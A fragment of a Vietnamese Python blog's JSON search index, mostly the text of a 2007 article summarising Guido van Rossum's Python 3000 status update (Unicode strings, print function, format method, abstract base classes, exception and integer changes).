Cho nên, nếu bạn viết mã lanh lợi nhất có thể, thì bạn, theo định nghĩa, không đủ thông minh để gỡ rối. Nói một cách khác, hãy giữ cho chương trình của bạn đơn giản. Đừng sáng tạo lại bánh xe Trước khi viết mã, hãy: Xem qua thư viện chuẩn của Python Xem qua chỉ mục các gói Python (còn được biết đến là Cửa hàng phô mai , Cheese Shop) Tìm qua mạng","tags":"Bài viết","title":"Lập trình như một Pythonista: Thành ngữ Python"},{"url":"2007/06/cap-nhat-tinh-hinh-python-3000.html","text":"Ngày 19 tháng 06 năm 2007, Guido van Rossum, tác giả ngôn ngữ Python, gửi lên mạng một bài cập nhật về tình hình phát triển Python 3000. Bài lược dịch (từ trang http://www.artima.com/weblogs/viewpost.jsp?thread=208549 ) này tóm tắt về khoảng trượt kế hoạch 2 tháng và nhiều tính năng mới. Nhìn chung về kế hoạch Lịch sử Guido nghĩ đến ý tưởng về Python 3000 (tên được đặt ra nhằm để chế giễu Windows 2000) vào khoảng năm 2000, trong một hội thảo Python. Theo đó, Python 3000 sẽ là bản đầu tiên bỏ qua tính tương thích ngược để tạo ra một ngôn ngữ tốt nhất cho sau này. Diễn biến gần đây Khoảng một năm rưỡi trước, Guido thật sự bắt đầu thiết kế Python 3000. Hàng loạt đề xuất cải tiến Python (Python Enhancement Proposal, PEP) ra đời được đặt số thứ tự từ 3000 trở lên (PEP 3000 trước đó được đổi thành PEP 3100). PEP 3000 trở thành tài liệu chính về tư tưởng và kế hoạch của Python 3000. Từ đó, việc phát triển đã chảy dưới chân cầu python-dev , và sau đó được chuyển hẳn qua python-3000 . Kế hoạch dự tính Lịch trình được thông báo khoảng một năm trước và nhắm vào cuối tháng 06 năm 2007 sẽ có bản alpha đầu tiên và vào một năm sau có bản cuối cùng (Python 3.0 là dấu hiệu phiên bản khi nó được phát hành; \"Python 3000\" hay \"Py3k\" là tên mã của dự án). Kế hoạch này đã bị trễ một chút. Hiện tại chúng ta dự tính khoảng cuối tháng 08 mới có bản alpha, và dĩ nhiên bản cuối cùng cũng bị trễ hai tháng. Lý do chính cho sự trễ này chủ yếu là do việc chuyển qua sử dụng Unicode toàn bộ. Python 2.6 Phiên bản \"đồng hành\" 2.6 sẽ ra lò vài tháng trước 3.0. Nếu bạn không thích sử dụng phiên bản mới nhất, thì 2.6 sẽ là phiên bản bạn sẽ dùng, và nó sẽ không khác gì mấy so với 2.5. Tính tương thích và sự chuyển đổi Tính tương thích Python 3.0 sẽ phá vỡ tính tương thích ngược. Toàn bộ. Ngược lại, Python 2.6 sẽ giữ vững tính tương thích ngược với Python 2.5 (và các phiên bản khác có thể), và nó cũng sẽ hỗ trợ tương thích tiến, theo những lối sau: Python 2.6 sẽ hỗ trợ chế độ cảnh báo Py3k và sẽ cảnh báo khi chạy những tính năng mà sẽ không còn hoạt động trong Python 3.0, ví dụ như khi nghĩ hàm range() trả về một danh sách. Python 2.6 sẽ có những chức năng từ Py3k, kích hoạt bằng __future__ hoặc sử dụng cả cú pháp mới lẫn cú pháp cũ (nếu cú pháp không hợp lệ trong 2.5). Cùng với tính tương thích tiến, sẽ có một công cụ chuyển đổi mã nguồn . Công cụ này có thể dịch từ-nguồn-tới-nguồn theo chế độ phi ngữ cảnh. Lấy một ví dụ thật đơn giản, nó có thể dịch apply(f, args) thành f(*args) . Tuy nhiên, công cụ này không thể khảo sát dữ liệu hoặc phỏng đoán kiểu cho nên nó chỉ đơn giản giả định rằng apply trong ví dụ này là hàm có sẵn trong phiên bản cũ. Việc chuyển đổi Mô hình phát triển một kế hoạch mà cần hỗ trợ cả 2.6 và 3.0 cùng lúc được khuyến khích như sau: Bắt đầu bằng hàng loạt các kiểm tra đơn vị (unit test), tốt nhất là bao trùm toàn bộ. Chuyển kế hoạch qua Python 2.6. Bật chế độ cảnh báo Py3k. Kiểm tra và chỉnh sửa cho đến khi không còn cảnh báo. Dùng công cụ 2to3 để chuyển mã nguồn này sang cú pháp 3.0. Không sửa kết quả bằng tay! . Kiểm tra mã nguồn đã đổi ở 3.0. Nếu phát hiện vấn đề thì sửa mã cho phiên bản 2.6 và quay lại bước 3. Khi cần phát hành, phát hành hai bản 2.6 và 3.0 riêng biệt. Nếu công cụ chuyển đổi và tính tương thích tiến trong Python 2.6 làm việc tốt, các bước từ 2 đến 6 sẽ không cần nhiều hơn những gì cần thiết để chuyển từ Python 2.x lên 2.(x+1). Tình hình của những tính năng riêng lẻ Có rất nhiều thay đổi để liệt kê hết ra ở đây nên chỉ những tính năng quan trọng, hoặc có mâu thuẫn sẽ được nhắc đến. Unicode, Codec và I/O Chúng ta đang chuyển qua mô hình được biết đến ở Java: các chuỗi (bất biến, immutable) là Unicode, và dữ liệu nhị phân được biểu diễn bởi một kiểu byte dữ liệu khả biến (mutable) riêng. Hơn nữa, trình phân tích cú pháp sẽ sử dụng được cả Unicode: bảng mã mặc định của mã nguồn sẽ là UTF-8, các ký tự không nằm trong bảng ASCII có thể được dùng trong tên chỉ định (identifier). Vẫn còn nhiều vấn đề về chuẩn hóa, một vài ký tự cụ thể, và việc hỗ trợ các ngôn ngữ từ phải qua trái. Dù vậy, bộ thư viện chuẩn sẽ tiếp tục dùng ASCII cho các tên chỉ định và hạn thế các ký tự không ASCII trong ghi chú và các chuỗi trong kiểm tra đơn vị cho các tính năng Unicode và tên tác giả. Chúng ta dùng \"...\" hay '...' cho các chuỗi Unicode, và b\"...\" hay b'...' cho các byte. Ví dụ, b'abc' có nghĩa là tạo một đối tượng byte y như kết quả của bytes([97, 98, 99]) . Chúng ta sẽ theo một hướng khác với các codec: trong Python 2, các codec có thể nhận Unicode hoặc 8-bit như đầu nhập và xuất, trong Py3k, mã hóa (encoding) luôn luôn là từ một chuỗi Unicode thành một mảng byte, và giải mã (decoding) luôn luôn đi theo chiều ngược lại. Điều này có nghĩa là chúng ta sẽ bỏ một vài codec không tương thích với mô hình ví dụ như rot13 , base64 và bz2 (những chuyển đổi này sẽ vẫn còn được hỗ trợ, chỉ có điều là không phải qua API mã hóa/giải mã). Thư viện I/O mới Sự phân biệt giữa byte và chuỗi dẫn đến một thay đổi nhỏ trong API. Trong thư viện mới, các dòng nhị phân (binary stream) (khi mở tập tin theo rb hoặc wb ) và dòng văn bản (text stream) được phân biệt rõ ràng. Các dòng văn bản có một thuộc tính mới, encoding, có thể được thiết lập khi dòng được mở; nếu encoding không được cho biết trước, mặc định của hệ thống sẽ được dùng. Việc đọc từ dòng nhị phân sẽ trả về mảng byte, trong khi đọc từ dòng văn bản sẽ trả về chuỗi Unicode; và tương tự cho việc viết. Viết một chuỗi văn bản vào dòng nhị phân hoặc viết mảng byte vào dòng văn bản sẽ dẫn đến ngoại lệ (exception). Mặc dù vẫn còn hàm open() , định nghĩa đầy đủ của thư viện I/O mới được đặt trong môđun io . Môđun này cũng chứa các lớp khác cho các loại dòng khác nhau, một cài đặt mới của StringIO , và một lớp mới BytesIO giống như StringIO nhưng dùng cho dòng nhị phân, để đọc và viết mảng byte.</p> In ấn và định dạng Hai chức năng I/O khác: lệnh print trở thành hàm print() , và phép định dạng chuỗi % sẽ được thay bằng phương thức (method) format() ở các đối tượng chuỗi. Chuyển print thành một hàm sẽ làm nhiều người suy nghĩ. Tuy nhiên, có một vài điểm tốt ở đây: nó sẽ rất dễ hơn để chuyển từ việc dùng hàm print() thành việc dùng gói logging ; và cú pháp print luôn có một ít tranh cãi vì kiểu << file và ý nghĩa của dấu phẩy cuối cùng. Tương tự, phương thức format() tránh được một vài điểm xấu của toán tử % cũ, đặc biệt là kết quả bất ngờ của \"%s\" % x khi x là tuple, và lỗi thường xảy ra khi vô tình bỏ quên s trong %(name)s . Các chuỗi định dạng mới sử dụng {0} , {1} , {2} , ... cho các tham số theo vị trí, và {a} , {b} , ... cho các tham số theo từ khóa. Tính năng khác bao gồm {a.b.c} cho thuộc tính và ngay cả {a[b]} cho dãy hoặc ánh xạ. Độ dài của trường có thể được chỉ định giống như {a:8} ; cách viết như vậy cũng hỗ trợ các tùy chọn khác. Phương thức format() có thể được mở rộng theo nhiều chiều: bằng cách định nghĩa một phương thức __format__() đặc biệt, các kiểu dữ liệu có thể quyết định cách định dạng, cách sử dụng các tham số; bạn cũng có thể tạo các lớp định dạng riêng nhằm để tự động cung cấp biến cục bộ như tham số cho cách định dạng. Các thay đổi về lớp và hệ thống kiểu Bạn có thể đoán được rằng các lớp cổ điển cuối cùng cũng ra đi. Lớp object sẽ là lớp cơ sở mặc định cho các lớp mới. Điều này tạo chỗ cho những tính năng sau: Trang hoàng lớp (Class decorators). Chúng hoạt động như các trang hoàng hàm (function decorators): @art_deco class C : ... Ký hiệu hàm và phương thức từ nay có thể được \"ghi chú\" (annotated). Ngôn ngữ gốc sẽ không đặt ý nghĩa vào các ghi chú này (ngoài việc cung cấp chúng cho việc tự xét, introspection), nhưng một vài thư viện chuẩn sẽ làm vậy; ví dụ, hàm tổng quát (generic function) (xem ở dưới) có thể dùng chúng. Cú pháp cũng dễ đọc: def foobar ( a : Integer , b : Sequence ) -> String : ... Cú pháp siêu lớp (metaclass) mới. Thay vì đặt một biến __metaclass__ trong thân lớp, bây giờ bạn phải chỉ định siêu lớp bằng cách dùng thông số từ khóa trong định nghĩa lớp, ví dụ như: class C ( bases , metaclass = MyMeta ): ... Từ điển lớp (class dictionary) riêng. Nếu siêu lớp định nghĩa một phương thức __prepare__() , nó sẽ được gọi trước khi vào thân lớp, và giá trị trả về sẽ được dùng thay cho từ điển chuẩn như là vùng tên (namespace) dùng trong thân lớp. Điểm này có thể được sử dụng để cài đặt kiểu cấu trúc (struct) khi thứ tự các phần tử có vai trò quan trọng. Bạn có thể chỉ định lớp cơ sở lúc chạy, như: bases = ( B1 , B2 ) class C ( * bases ): ... Các thông số từ khóa khác cũng được cho phép ở đầu đề lớp; chúng được truyền cho phương thức __new__ của siêu lớp. Bạn có thể định nghĩa lại các kiểm tra isinstance() và issubclass() , bằng cách định nghĩa các phương thức __instancecheck__() và __subclasscheck__() của lớp. Khi chúng được định nghĩa, isinstance(x, C) thành tương tự như C.__instancecheck__(x) , và issubclass(D, C) là C.__subclasscheck__(D) . Lớp cơ sở trừu tượng tự chọn (Voluntary Abstract Base Classes). Nếu bạn muốn định nghĩa một lớp hoạt động như một ánh xạ chẳng hạn, bạn có thể tự giác kế thừa (voluntarily inherit) từ lớp abc.Mapping . Một mặt, lớp này cung cấp các cách thức có ích thay thế gần hết tính năng của các lớp UserDict và DictMixin . Mặt khác, sử dụng các ABC một cách có hệ thống có thể giúp các khung (framework) lớn thực hiện nhiều việc đúng đắn với ít \"phỏng đoán\" hơn: trong Python 2 khó mà nói rằng một đối tượng là một dãy, hay là một ánh xạ khi nó định nghĩa phương thức __getitem__() . Các ABC sau được cung cấp cho người dùng: Hashable , Iterable , Iterator , Sized , Container , Callable ; Set , MutableSet ; Mapping , MutableMapping ; Sequence , MutableSequence ; Number , Complex , Real , Rational , Integer . Môđun io cũng định nghĩa một số ABC cho nên đây là lần đầu tiên Python có một đặc tả cho khái niệm file-like (như kiểu tập tin) u ám. Sức mạnh của khung ABC nằm ở khả năng (ability) (mượn từ các giao tiếp Zope, Zope interface) đăng ký một lớp cụ thể (concrete class) X như kế thừa ảo từ một ABC Y , trong khi X và Y được viết bởi các tác giả khác nhau và có mặt trong các gói khác nhau. (Để làm rõ, khi dùng kế thừa ảo, cách thức của lớp Y không được cung cấp cho lớp X ; hiệu quả duy nhất là issubclass(X, Y) sẽ trả về True .) Để hỗ trợ việc định nghĩa ABC mà cần các lớp cụ thể thật sự cài đặt đầy đủ giao tiếp, trang hoàng @abc.abstractmethod có thể được dùng để khai báo các phương thức trừu tượng (chỉ dùng trong các lớp mà siêu lớp là, hoặc, kế thừa từ abc.ABCMeta ). Hàm tổng quát (generic functions). Việc thêm vào chức năng này, được trình bày trong PEP 3124, có vẻ chưa rõ lắm, vì PEP này có vẻ đã dậm chân tại chỗ. Hy vọng rằng nó sẽ được tiếp tục. Nó hỗ trợ sự chuyển hàm (function dispatch) dựa vào kiểu của các tham số, thay vì kiểu thông thường chỉ dựa vào lớp của đối tượng đích (target object). Các thay đổi lớn khác Chỉ một vài điểm sáng. Sửa đổi về ngoại lệ Các ngoại lệ chuỗi (string exception) không còn dùng. Mọi ngoại lệ phải bắt nguồn từ BaseException và tốt hơn là từ Exception . Chúng ta sẽ bỏ StandardException . Ngoại lệ không còn hoạt động như dãy nữa. Thay vào đó chúng có một thuộc tính args chứa tham số được truyền vào hàm khởi tạo (constructor). Cú pháp except E, e: được đổi thành except E as e . Điều này tránh những lẫn lộn hay gặp như except E1, E2: . Tên biến đằng sau as trong câu except bị ép xóa thẳng ngay khi thoát khỏi câu except . sys.exc_info() trở nên dư thừa (hoặc có thể biến mất): thay vào đó, e.__class__ là kiểu ngoại lệ, và e.__traceback__ là vết ngược. Những thuộc tính tùy chọn như __context__ được thiết lập là ngoại lệ trước khi một ngoại lệ xảy ra trong câu except hay finally ; __cause__ có thể được thiết lập trực tiếp khi nâng ngoại lệ (raise exception) bằng cách dùng raise E1 from E2 . Các biến thể cũ của cú pháp raise như raise E, e và raise E, e, tb biến mất. Sửa đổi về số nguyên Sẽ chỉ có một kiểu số nguyên tên là int với cách thức của long trong Python 2. Hậu tố L biến mất. 1/2 sẽ trả về 0.5, không phải 0. (Dùng 1//2 nếu cần điều đó.) Cú pháp của số bát phân đổi thành 0o777 , để tránh gây ra khó hiểu cho người mới. Số nhị phân: 0b101 == 5 , bin(5) == '0b101' . Bộ lặp (Iterator) hoặc khả lặp (Iterable) thay thế danh sách (List) dict.keys() và dict.items() trả về tập hợp; dict.values() trả về một cách nhìn khả lập (iterable view). Các phương thức iter*() khác biến mất. range() trả về kiểu đối tượng mà xrange() đã từng làm; xrange() biến mất. zip() , map() , filter() trả về các đối tượng khả lặp (như những hàm tương tự trong itertools ). Các điểm khác So sánh hơn kém ( < , <= , > , >= ) sẽ nâng TypeError thay vì trả về kết quả bất định. So sánh bằng ( == , != ) mặc định sẽ so sánh tính đồng nhất của hai đối tượng ( is , is not ). Câu lệnh nonlocal cho phép bạn gán vào các biến ở vòng ngoài (không phải toàn cục) (outer, non-global scope). Lệnh gọi super() mới: Gọi super() không tham số tương đương với super(<this_class>, <first_arg>) . super() có thể dùng trong phương thức đối tượng hoặc phương thức của lớp. Tập hợp: {1, 2, 3} và ngay cả bao hàm tập hợp (set comprehension): {x for x in y if P(x)} . Chú ý rằng tập hợp rỗng là set() , vì {} là một từ điển rỗng! reduce() biến mất (thật ra là chuyển vào functools ). Nó cho thấy rằng hầu hết các mã dùng reduce() có thể trở nên dễ đọc hơn khi được viết lại bằng vòng lặp for . ( Ví dụ .) lambda vẫn tồn tại. Cú pháp dấu phẩy ngược (backtick), thường khó đọc, biến mất (thay vào đó dùng repr() ), cũng như toán tử <> (thay vào đó nên dùng != ). Ở mức C, sẽ có một API bộ đệm mới, tốt hơn nhiều và sẽ cung cấp kết nối tốt hơn cho numpy (PEP 3118). Sửa đổi về thư viện Guido không muốn nói nhiều về các thay đổi ở thư viện chuẩn vì nó sẽ chỉ được thực hiện khi 3.0a1 ra đời. Vẫn rõ ràng thấy được là chúng ta sẽ bỏ nhiều thứ hết hạn hoặc không còn được hỗ trợ (ví dụ như nhiều môđun chỉ chạy với SGI IRIX), và chúng ta sẽ cố đổi tên các môđun sử dụng TênHoa như StringIO hay UserDict , để tương hợp với chuẩn đặt tên của PEP 8 (yêu cầu tên ngắn, toàn chữ thường cho môđun). Và cuối cùng Guido muốn nhấn mạnh rằng lambda sẽ vẫn tồn tại.","tags":"Bài viết","title":"Cập nhật tình hình Python 3000"}]}